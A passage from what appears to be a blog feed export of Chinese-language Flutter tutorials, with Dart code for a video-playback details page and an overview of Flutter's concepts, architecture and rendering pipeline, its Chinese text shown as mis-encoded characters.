class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DetailsPage</span> <span class="keyword">extends</span> <span class="title">StatefulWidget</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="built_in">String</span> videoId; <span class="comment">// è·¯ç”±æºå¸¦çš„ æ’­æ”¾id å‚æ•°</span></span><br><span class="line"></span><br><span class="line">    DetailsPage(<span class="keyword">this</span>.videoId); <span class="comment">// æ„é€ æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@override</span></span><br><span class="line">    _DetailsPageState createState() =&gt; _DetailsPageState(<span class="keyword">this</span>.videoId); <span class="comment">// æŠŠ å‚æ•°å†æ¬¡å‘ä¸‹ä¼ å…¥ã€‚</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_DetailsPageState</span> <span class="keyword">extends</span> <span class="title">State</span>&lt;<span class="title">DetailsPage</span>&gt; </span>&#123;</span><br><span class="line">  <span class="keyword">final</span> <span class="built_in">String</span> _videoId; <span class="comment">// è¿™é‡Œå°±æ˜¯ ä¼ å…¥çš„å‚æ•°ï¼Œè¿™æ ·å°±ä½¿ç”¨è§†é¢‘IDï¼Œåœ¨ç›¸åº”çš„ç”Ÿå‘½å‘¨æœŸä¸­å»è·å–æ•°æ®äº†ã€‚</span></span><br><span class="line">  _DetailsPageState(<span class="keyword">this</span>._videoId); <span class="comment">// æ„é€ æ–¹æ³•</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è®°ä½ï¼Œç±»å¯¹è±¡å¿…é¡»æ„é€ æ–¹æ³•ä¼ å‚æ•°ã€‚</p><h3 id="è§†é¢‘æ’­æ”¾"><a href="#è§†é¢‘æ’­æ”¾" class="headerlink" title="è§†é¢‘æ’­æ”¾"></a>è§†é¢‘æ’­æ”¾</h3><p>è§†é¢‘æ’­æ”¾ä½¿ç”¨äº†è¿™2ä¸ªæ’ä»¶ï¼Œvideo_playerã€chewie</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:flutter/material.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:video_player/video_player.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:chewie/chewie.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:yysp/servers/httpUtil.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:yysp/servers/Api.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:yysp/model/video_detail.dart&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DetailsPage</span> <span class="keyword">extends</span> <span class="title">StatefulWidget</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="built_in">String</span> videoId; <span class="comment">// è·¯ç”±æºå¸¦çš„ æ’­æ”¾id å‚æ•°</span></span><br><span class="line"></span><br><span class="line">    DetailsPage(<span class="keyword">this</span>.videoId);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@override</span></span><br><span class="line">    _DetailsPageState createState() =&gt; _DetailsPageState(<span class="keyword">this</span>.videoId);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_DetailsPageState</span> <span class="keyword">extends</span> <span class="title">State</span>&lt;<span class="title">DetailsPage</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="built_in">String</span> _videoId;</span><br><span class="line">    Video _videoInfo = <span class="keyword">new</span> Video(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="comment">// å®ä¾‹åŒ–æ’­æ”¾æ§åˆ¶å™¨ï¼Œé€šè¿‡è¿™ä¸ªæ§åˆ¶å™¨å»å®ç°æ’­æ”¾ã€æš‚åœã€è§†é¢‘åˆ‡æ¢ã€‚</span></span><br><span class="line">    VideoPlayerController _videoPlayController = <span class="keyword">new</span> VideoPlayerController.network(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    HttpUtil httpUtil = <span class="keyword">new</span> HttpUtil();</span><br><span class="line">    _DetailsPageState(<span class="keyword">this</span>._videoId);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@override</span></span><br><span class="line">    Widget build(BuildContext context) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MaterialApp(</span><br><span class="line">            home: <span class="keyword">new</span> Scaffold(</span><br><span class="line">                appBar: AppBar(</span><br><span class="line">                    title: Text(</span><br><span class="line">                        <span class="string">&quot;é¹°çœ¼è§†é¢‘&quot;</span>,</span><br><span class="line">                        style: <span class="keyword">new</span> TextStyle(fontSize: <span class="number">20.0</span>, letterSpacing: <span class="number">3.0</span>),</span><br><span class="line">                    ),</span><br><span class="line">                    ),</span><br><span class="line">                    body: Column(</span><br><span class="line">                    children: &lt;Widget&gt;[</span><br><span class="line">                        Container(</span><br><span class="line">                        child: <span class="keyword">this</span>._buildVideo()</span><br><span class="line">                        ),</span><br><span class="line">                        Text(_videoInfo.title)</span><br><span class="line">                    ],</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="meta">@override</span></span><br><span class="line">    <span class="keyword">void</span> initState() &#123;</span><br><span class="line">        <span class="keyword">super</span>.initState();</span><br><span class="line">        <span class="keyword">this</span>._getVideoInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@override</span></span><br><span class="line">    <span class="keyword">void</span> dispose() &#123;</span><br><span class="line">        <span class="keyword">super</span>.dispose();</span><br><span class="line">        _videoPlayController.pause();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è·å–ç½‘ç»œæ•°æ® è§†é¢‘æ’­æ”¾è¯¦æƒ…</span></span><br><span class="line">    <span class="keyword">void</span> _getVideoInfo() <span class="keyword">async</span> &#123;</span><br><span class="line">        <span class="built_in">String</span> url = Api.VideoInfo;</span><br><span class="line">        <span class="keyword">var</span> data = &#123;<span class="string">&#x27;id&#x27;</span>: <span class="keyword">this</span>._videoId&#125;;</span><br><span class="line">        <span class="keyword">var</span> response = <span class="keyword">await</span> HttpUtil().<span class="keyword">get</span>(url, data: data);</span><br><span class="line">        VideoDetail videos = VideoDetail.fromJson(response);</span><br><span class="line">        <span class="keyword">if</span> (videos.code == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// è§†é¢‘è·å–å›æ¥ï¼Œå°±åˆå§‹åŒ– æ’­æ”¾æ§åˆ¶å™¨</span></span><br><span class="line">        _videoPlayController = VideoPlayerController.network( videos.data.video.src );</span><br><span class="line">        setState(() &#123;</span><br><span class="line">            _videoInfo = <span class="keyword">new</span> Video(videos.data.video.id, videos.data.video.title, videos.data.video.url, videos.data.video.auther, videos.data.video.pubtime, videos.data.video.img, videos.data.video.src, videos.data.video.desc1, videos.data.video.cate, videos.data.video.pt, videos.data.video.collect, videos.data.video.count, videos.data.video.insertTime);</span><br><span class="line">        &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è§†é¢‘ ç»„ä»¶ï¼Œä¼ é€’äº†VideoPlayControlleræ§åˆ¶å™¨</span></span><br><span class="line">    Widget _buildVideo() &#123;</span><br><span class="line">        _videoPlayController.play();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Chewie(</span><br><span class="line">            _videoPlayController,</span><br><span class="line">            aspectRatio: <span class="number">3</span> / <span class="number">2</span>,</span><br><span class="line">            autoPlay: <span class="keyword">true</span>,</span><br><span class="line">            looping: <span class="keyword">false</span>,</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>####<br>æ€»ç»“ï¼šè¯´äº†è¿™ä¹ˆå¤šï¼Œå…¶å®Flutterå­¦çš„æ˜¯æ¡†æ¶ï¼Œæœ€ä¸»è¦çš„æ˜¯å­¦ä¼šdartè¯­è¨€ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> flutter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flutter</title>
      <link href="posts/2a2a7e8a/"/>
      <url>posts/2a2a7e8a/</url>
      
        <content type="html"><![CDATA[<h2 id="Flutter"><a href="#Flutter" class="headerlink" title="Flutter"></a>Flutter</h2><blockquote><p><a href="https://flutter.io/">Flutter</a> æ˜¯è°·æ­Œçš„ç§»åŠ¨UIæ¡†æ¶ï¼Œå¯ä»¥å¿«é€Ÿåœ¨iOSå’ŒAndroidä¸Šæ„å»ºé«˜è´¨é‡çš„åŸç”Ÿç”¨æˆ·ç•Œé¢ã€‚ Flutterå¯ä»¥ä¸ç°æœ‰çš„ä»£ç ä¸€èµ·å·¥ä½œã€‚åœ¨å…¨ä¸–ç•Œï¼ŒFlutteræ­£åœ¨è¢«è¶Šæ¥è¶Šå¤šçš„å¼€å‘è€…å’Œç»„ç»‡ä½¿ç”¨ï¼Œå¹¶ä¸” <a href="https://flutter.io/">Flutter</a> æ˜¯å®Œå…¨å…è´¹ã€å¼€æºçš„ã€‚</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">ä¸­æ–‡å®˜ç½‘:</span><br><span class="line">https:&#x2F;&#x2F;flutterchina.club&#x2F;setup-macos&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;flutter-io.cn&#x2F;</span><br><span class="line"></span><br><span class="line">ç¬¬ä¸‰æ–¹åº“   å¯ä»¥ç†è§£ä¸ºnpm</span><br><span class="line">https:&#x2F;&#x2F;pub.dartlang.org&#x2F;flutter</span><br><span class="line"></span><br><span class="line">ç¯å¢ƒæ­å»º\å…¥é—¨\å¡«å‘æŒ‡å—</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;hekaiyou&#x2F;article&#x2F;details&#x2F;52874796</span><br><span class="line">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;399c01657920</span><br><span class="line">       </span><br><span class="line">å›½å†…Flutterè®ºå›</span><br><span class="line">http:&#x2F;&#x2F;flutter-dev.cn&#x2F;</span><br><span class="line"></span><br><span class="line">Dart\Flutter æ‰©å±•æ’ä»¶</span><br><span class="line">https:&#x2F;&#x2F;dartcode.org&#x2F;releases&#x2F;v2-19&#x2F;</span><br><span class="line"></span><br><span class="line">Flutterå…¥é—¨å®ä¾‹</span><br><span class="line">https:&#x2F;&#x2F;juejin.im&#x2F;post&#x2F;5b31d776e51d455e2b5ab253</span><br><span class="line"></span><br><span class="line">Widgetç»„ä»¶ä»‹ç»</span><br><span class="line">https:&#x2F;&#x2F;juejin.im&#x2F;post&#x2F;5bab35ff5188255c3272c228</span><br><span class="line"></span><br><span class="line">GitHub-Flutterèšé›†åœ°</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;xitu&#x2F;awesome-flutter</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>** æ¦‚å¿µ **</p><ol><li><p>Flutteræ˜¯ä¸€ä¸ªç§»åŠ¨åº”ç”¨ç¨‹åºçš„è½¯ä»¶å¼€å‘å·¥å…·åŒ…ï¼ˆSDKï¼‰ï¼Œå…·æœ‰ä»¥ä¸‹ç‰¹å¾ï¼š</p><blockquote><p>è·¨å¹³å°åº”ç”¨çš„æ¡†æ¶ï¼Œæ²¡æœ‰ä½¿ç”¨WebViewæˆ–è€…ç³»ç»Ÿå¹³å°è‡ªå¸¦çš„æ§ä»¶ï¼Œä½¿ç”¨è‡ªèº«çš„é«˜æ€§èƒ½æ¸²æŸ“å¼•æ“è‡ªç»˜<br>ç®€åŒ–ç‰ˆçš„æµè§ˆå™¨ï¼Œæœ€å¤§é™åº¦åœ¨androidå’Œiosä¸Šç»Ÿä¸€UIï¼ŒåŒ…æ‹¬ä¸šåŠ¡é€»è¾‘å’Œç”¨æˆ·ä½“éªŒ<br>å¼€å‘è¯­è¨€ä½¿ç”¨dartï¼Œç»“åˆC, C++, å’ŒSkiaï¼ˆ2Dæ¸²æŸ“å¼•æ“ï¼‰æ„å»º<br>æ”¯æŒhot reloadï¼ŒåŒ…å«ç€å®Œæ•´çš„æ§ä»¶å’Œå·¥å…·é“¾</p></blockquote><blockquote><p>ä¸€åˆ‡çš†æ§ä»¶ï¼Œæ§ä»¶æ˜¯æ¯ä¸ªFlutteråº”ç”¨ç¨‹åºçš„åŸºæœ¬æ„å»ºå—ï¼Œä¸åˆ†ç¦»è§†å›¾ã€æ§åˆ¶å™¨ã€å¸ƒå±€å’Œå…¶ä»–å±æ€§çš„æ¡†æ¶ä¸åŒï¼ŒFlutterå…·æœ‰ä¸€è‡´çš„ç»Ÿä¸€å¯¹è±¡æ¨¡å‹ï¼šæ§ä»¶ã€‚ä¸€ä¸ªæ§ä»¶å¯ä»¥å®šä¹‰ï¼šç»“æ„å…ƒç´ ï¼ˆæ¯”å¦‚æŒ‰é’®æˆ–èœå•ï¼‰ã€é£æ ¼å…ƒç´ ï¼ˆæ¯”å¦‚å­—ä½“æˆ–é¢œè‰²æ–¹æ¡ˆï¼‰ã€å¸ƒå±€çš„æ–¹é¢ï¼ˆæ¯”å¦‚å¡«å……ï¼‰ã€ä¸€äº›ä¸šåŠ¡é€»è¾‘ç­‰</p></blockquote><blockquote><p>ä¸Reactç†å¿µç›¸åŒï¼Œéƒ½æ˜¯ç»„åˆå¤§äºç»§æ‰¿ï¼Œæ§ä»¶æœ¬èº«é€šå¸¸ç”±è®¸å¤šå°å‹ã€å•ç”¨é€”çš„æ§ä»¶ç»„æˆï¼Œç»“åˆèµ·æ¥äº§ç”Ÿå¼ºå¤§çš„æ•ˆæœï¼Œç±»çš„å±‚æ¬¡ç»“æ„æ˜¯æ‰å¹³çš„ï¼Œä»¥æœ€å¤§åŒ–å¯èƒ½çš„ç»„åˆæ•°é‡</p></blockquote><blockquote><p>å¼ºåŒ–ç‰ˆçš„WebViewï¼Œæ¡†æ¶ä»…æä¾›ä¸€ä¸ªViewå±‚ï¼Œå¤§éƒ¨åˆ†åŠŸèƒ½è¦ä¾èµ–åŸç”Ÿ<br>ç›®å‰åªèƒ½å¤Ÿè¿è¡Œå¤§éƒ¨åˆ†Dartä»£ç ï¼ˆä¸èƒ½å¼•å…¥dart:mirrorsæˆ–dart:htmlåº“ï¼‰</p></blockquote></li></ol><p>** ä¼˜åŠ¿ **</p><ol><li><p>å®è§‚ä¸Šï¼š</p><blockquote><p>Flutterèƒ½å¤Ÿæä¾›ä¼˜ç¾çš„UIå’Œæµç•…çš„ä½¿ç”¨ä½“éªŒ<br>Flutteré™ä½äº†å¼€å‘Appçš„é—¨æ§›ï¼ŒåŠ é€Ÿç§»åŠ¨åº”ç”¨çš„å¼€å‘é€Ÿåº¦ï¼Œå¹¶ä¸”èƒ½å¤Ÿé™ä½åŒæ—¶å¼€å‘Androidå’ŒiOSåº”ç”¨çš„æˆæœ¬å’Œå¤æ‚åº¦<br>Flutterèƒ½å¤Ÿè½»æ¾åšå‡ºåŸå‹å¹¶ä¸”èƒ½å¤Ÿä¿æŒç›¸å½“é«˜è¿˜åŸåº¦</p></blockquote></li><li><p>å¾®è§‚ä¸Šï¼š</p><blockquote><p>é«˜æ•ˆç‡ï¼Œç”¨ä¸€å¥—ä»£ç åº“å°±èƒ½å¼€å‘iOSå’ŒAndroidåº”ç”¨<br>ä½¿ç”¨æ–°å‹çš„ã€è¡¨ç°åŠ›å¼ºçš„è¯­è¨€å’Œå£°æ˜å¼çš„æ–¹æ³•ï¼Œç”¨æ›´å°‘çš„ä»£ç æ¥åšæ›´å¤šçš„äº‹æƒ…<br>å¯ä»¥åœ¨åº”ç”¨ç¨‹åºè¿è¡Œæ—¶æ›´æ”¹ä»£ç å¹¶é‡æ–°åŠ è½½æŸ¥çœ‹æ•ˆæœï¼Œä¹Ÿå°±æ˜¯çƒ­é‡æ–°åŠ è½½<br>ä¿®å¤å´©æºƒæ—¶å¯ä»¥ä»åº”ç”¨ç¨‹åºåœæ­¢çš„ä½ç½®ç»§ç»­è°ƒè¯•<br>åˆ›å»ºç¾è§‚ã€é«˜åº¦å®šåˆ¶çš„ç”¨æˆ·ä½“éªŒ<br>Flutteræ¡†æ¶å†…ç½®äº†ä¸€ç»„ä¸°å¯Œçš„è´¨æ„Ÿè®¾è®¡æ§ä»¶<br>å®ç°å®šåˆ¶ã€ç¾è§‚ã€å“ç‰Œé©±åŠ¨çš„è®¾è®¡ï¼Œè€Œä¸å—OEMæ§ä»¶é›†çš„é™åˆ¶<br>æ·±åº¦ä¼˜åŒ–ï¼Œç§»åŠ¨ä¼˜å…ˆçš„2Dæ¸²æŸ“å¼•æ“è€Œä¸”å¯¹æ–‡æœ¬æ”¯æŒéå¸¸å‡ºè‰²<br>reacté£æ ¼çš„æ¡†æ¶<br>æ”¯æŒå•å…ƒå’Œé›†æˆæµ‹è¯•çš„API<br>æ”¯æŒä¸ç³»ç»Ÿå¹³å°å’Œç¬¬ä¸‰æ–¹SDKäº¤äº’çš„æ’ä»¶API<br>æ”¯æŒWindowsï¼ŒMacå’ŒLinuxçš„Headless test runner</p></blockquote></li></ol><h3 id="è¿è¡Œæœºåˆ¶"><a href="#è¿è¡Œæœºåˆ¶" class="headerlink" title="è¿è¡Œæœºåˆ¶"></a>è¿è¡Œæœºåˆ¶</h3><p>Flutter åº”ç”¨è¿è¡Œåœ¨ä¸€ä¸ªç”¨ C++ å†™çš„å¼•æ“ä¸­ï¼ŒFlutter åº”ç”¨å¯ä»¥çœ‹åšæ˜¯ä¸€ä¸ªæ¸¸æˆ Appï¼Œä»£ç éƒ½æ˜¯åœ¨å¼•æ“ä¸­è¿è¡Œã€‚</p><p>** Android **</p><p>å¼•æ“çš„Cæˆ–C++ä»£ç æ˜¯ç”±Android NDKç¼–è¯‘çš„ï¼Œè€Œæ¡†æ¶çš„ä¸»è¦ä»£ç å’Œåº”ç”¨çš„ä»£ç ç”±Dart compilerç¼–è¯‘æˆnative codeæ‰§è¡Œçš„ã€‚</p><p>å¯¹äºAndroidåº”ç”¨æ¥è¯´ï¼ŒFlutteræ¡†æ¶åœ¨å¼•æ“ä¸­å®ç°äº†ä¸€ä¸ªç»§æ‰¿äºSurfaceViewçš„ FlutterViewã€‚ç”¨æˆ·æ‰€çœ‹åˆ°çš„UIéƒ½æ˜¯åœ¨è¿™ä¸ªSurfaceViewä¸­æ˜¾ç¤ºã€‚å¦‚æœè¦å’ŒåŸç”Ÿå¹³å°åŠŸèƒ½äº¤äº’ï¼Œåˆ™å¯ä»¥åœ¨Activityä¸­ä½¿ç”¨FlutterViewï¼Œå¹¶é€šè¿‡Flutteræä¾›çš„æ¶ˆæ¯APIå’ŒåŸç”Ÿå¹³å°æ”¶å‘æ¶ˆæ¯ã€‚</p><p>** ios **</p><p>å¼•æ“çš„Cæˆ–C++ä»£ç æ˜¯ç”±LLVMç¼–è¯‘çš„ï¼Œè€Œæ‰€æœ‰Dartçš„ä»£ç ä¼šè¢«AOTç¼–è¯‘æˆnative codeï¼Œæ•´ä¸ªAPPè¿è¡Œæ—¶ä½¿ç”¨çš„æ˜¯æœºå™¨æŒ‡ä»¤ï¼ˆå¹¶ä¸æ˜¯æ‹¦æˆªå™¨ï¼‰ã€‚</p><h3 id="æ¶æ„"><a href="#æ¶æ„" class="headerlink" title="æ¶æ„"></a>æ¶æ„</h3><p>** å±‚æ¬¡æè¿° **</p><img src="/posts/2a2a7e8a/FlutterFramework.png" class="" title="Flutteræ¶æ„"><p>Flutterçš„æ¡†æ¶åˆ†ä¸ºFrameworkå’ŒEngineä¸¤å±‚ï¼Œåº”ç”¨æ˜¯åŸºäºFrameworkå±‚å¼€å‘çš„ï¼ŒFrameworkè´Ÿè´£æ¸²æŸ“ä¸­çš„Buildï¼ŒLayoutï¼ŒPaintï¼Œç”ŸæˆLayerç­‰ç¯èŠ‚ã€‚Engineå±‚æ˜¯C++å®ç°çš„æ¸²æŸ“å¼•æ“ï¼Œè´Ÿè´£æŠŠFrameworkç”Ÿæˆçš„Layerç»„åˆï¼Œç”Ÿæˆçº¹ç†ï¼Œç„¶åé€šè¿‡Open GLæ¥å£å‘GPUæäº¤æ¸²æŸ“æ•°æ®ã€‚</p><p>** å›¾å½¢ç®¡é“ **</p><img src="/posts/2a2a7e8a/FlutterFramework1.png" class="" title="Flutterè¿è¡Œ"><p>** æ¸²æŸ“ç®¡é“ **</p><img src="/posts/2a2a7e8a/flutterRun.png" class="" title="Flutterè¿è¡Œ"><p>å½“éœ€è¦æ›´æ–°UIçš„æ—¶å€™ï¼ŒFrameworké€šçŸ¥Engineï¼ŒEngineä¼šç­‰åˆ°ä¸‹ä¸ªVsyncä¿¡å·åˆ°è¾¾çš„æ—¶å€™ï¼Œä¼šé€šçŸ¥Frameworkï¼Œç„¶åFrameworkä¼šè¿›è¡Œanimations, buildï¼Œlayoutï¼Œcompositingï¼Œpaintï¼Œæœ€åç”Ÿæˆlayeræäº¤ç»™Engineã€‚Engineä¼šæŠŠlayerè¿›è¡Œç»„åˆï¼Œç”Ÿæˆçº¹ç†ï¼Œæœ€åé€šè¿‡Open Glæ¥å£æäº¤æ•°æ®ç»™GPUï¼Œ GPUç»è¿‡å¤„ç†ååœ¨æ˜¾ç¤ºå™¨ä¸Šé¢æ˜¾ç¤ºã€‚</p><p>å½“åº”ç”¨è°ƒç”¨setStateåï¼Œç»è¿‡Frameworkä¸€è¿ä¸²çš„è°ƒç”¨åï¼Œæœ€ç»ˆè°ƒç”¨scheduleFrameæ¥é€šçŸ¥Engineéœ€è¦æ›´æ–°UIï¼ŒEngineå°±ä¼šåœ¨ä¸‹ä¸ªvSyncåˆ°è¾¾çš„æ—¶å€™é€šè¿‡è°ƒç”¨_drawFrameæ¥é€šçŸ¥Frameworkï¼Œç„¶åFrameworkå°±ä¼šé€šè¿‡BuildOwnerè¿›è¡ŒBuildå’ŒPipelineOwnerè¿›è¡ŒLayoutï¼ŒPaintï¼Œæœ€åæŠŠç”ŸæˆLayerï¼Œç»„åˆæˆSceneæäº¤ç»™Engineã€‚æ¥ä¸‹æ¥æˆ‘ä»¬ä»ä»£ç ä¸­åˆ†æä¸€ä¸‹ï¼Œè¿™äº›ç¯èŠ‚å…·ä½“æ˜¯æ€ä¹ˆæ ·å®ç°çš„ã€‚é¦–å…ˆä»Engineå›è°ƒFrameworkçš„å…¥å£å¼€å§‹ã€‚</p><p>åœ¨Flutteråº”ç”¨å¼€å‘ä¸­,æ— çŠ¶æ€çš„widgetæ˜¯é€šè¿‡StatelessWidgetçš„buildæ–¹æ³•æ„å»ºUIï¼Œæœ‰çŠ¶æ€çš„widgetæ˜¯é€šè¿‡Stateçš„buildæ–¹æ³•æ„å»ºUIã€‚ç°åœ¨å…·ä½“åˆ†æä¸€ä¸‹ä»setStateè°ƒç”¨ååˆ°è°ƒç”¨è‡ªå®šä¹‰Stateçš„buildçš„æµç¨‹æ˜¯æ€æ ·çš„ï¼ˆç°åœ¨åªåˆ†ææœ‰çŠ¶æ€çš„widgetæ¸²æŸ“è¿‡ç¨‹ï¼‰ã€‚</p><p>åœ¨Flutterä¸­åº”ç”¨ä¸­ï¼Œæ˜¯ä½¿ç”¨æ”¯æŒlayoutçš„widgetæ¥å®ç°å¸ƒå±€çš„ï¼Œæ”¯æŒlayoutçš„wigetæœ‰Containerï¼ŒPaddingï¼ŒAlignç­‰ç­‰ï¼Œå¼ºå¤§åˆç®€æ˜“ã€‚åœ¨æ¸²æŸ“æµç¨‹ä¸­ï¼Œåœ¨widget buildåä¼šè¿›å…¥layoutç¯èŠ‚ï¼Œä¸‹é¢å…·ä½“åˆ†æä¸€ä¸‹layoutçš„å®ç°ï¼Œlayoutå…¥å£æ˜¯flushLayoutã€‚</p><h3 id="åº”ç”¨åœºæ™¯"><a href="#åº”ç”¨åœºæ™¯" class="headerlink" title="åº”ç”¨åœºæ™¯"></a>åº”ç”¨åœºæ™¯</h3><p>Flutter æ”¯æŒios android Tv åµŒå…¥å¼ç³»åˆ—å¼€å‘</p><h3 id="äº†è§£-Widget-ç»„ä»¶"><a href="#äº†è§£-Widget-ç»„ä»¶" class="headerlink" title="äº†è§£** Widget **ç»„ä»¶"></a>äº†è§£** Widget **ç»„ä»¶</h3><p>åœ¨Flutterä¸­ï¼Œæˆ‘ä»¬å¹³æ—¶è‡ªå®šä¹‰çš„widgetï¼Œä¸€èˆ¬éƒ½æ˜¯ç»§æ‰¿è‡ªStatefulWidgetæˆ–StatelessWidgetï¼ˆå¹¶ä¸æ˜¯åªæœ‰è¿™ä¸¤ç§ï¼‰ï¼Œè¿™ä¸¤ç§widgetä¹Ÿæ˜¯ç›®å‰æœ€å¸¸ç”¨çš„ä¸¤ç§ã€‚å¦‚æœä¸€ä¸ªæ§ä»¶è‡ªèº«çŠ¶æ€ä¸ä¼šå»æ”¹å˜ï¼Œåˆ›å»ºäº†å°±ç›´æ¥æ˜¾ç¤ºï¼Œä¸ä¼šæœ‰è‰²å€¼ã€å¤§å°æˆ–è€…å…¶ä»–å±æ€§çš„å˜åŒ–ï¼Œè¿™ç§widgetä¸€èˆ¬éƒ½æ˜¯ç»§æ‰¿è‡ªStatelessWidgetï¼Œå¸¸è§çš„æœ‰Containerã€ScrollViewç­‰ã€‚å¦‚æœä¸€ä¸ªæ§ä»¶éœ€è¦åŠ¨æ€çš„å»æ”¹å˜æˆ–è€…ç›¸åº”ä¸€äº›çŠ¶æ€ï¼Œä¾‹å¦‚ç‚¹å‡»æ€ã€è‰²å€¼ã€å†…å®¹åŒºåŸŸç­‰ï¼Œé‚£ä¹ˆä¸€èˆ¬éƒ½æ˜¯ç»§æ‰¿è‡ªStatefulWidgetï¼Œå¸¸è§çš„æœ‰CheckBoxã€AppBarã€TabBarç­‰ã€‚å…¶å®å•çº¯çš„ä»åå­—ä¹Ÿå¯ä»¥çœ‹å‡ºè¿™ä¸¤ç§widgetçš„åŒºåˆ«ï¼Œè¿™ä¸¤ç§widgetéƒ½æ˜¯ç»§æ‰¿è‡ªWidgetç±»ã€‚</p><p>Widgetç±»åœ¨Flutterä¸­æ˜¯éå¸¸é‡è¦çš„ï¼Œç»§æ‰¿è‡ªWidgetç±»çš„æœ‰PreferredSizeWidgetã€ProxyWidgetã€RenderObjectWidgetã€StatefulWidgetã€StatelessWidgetã€‚æˆ‘ä»¬æ—¥å¸¸ä½¿ç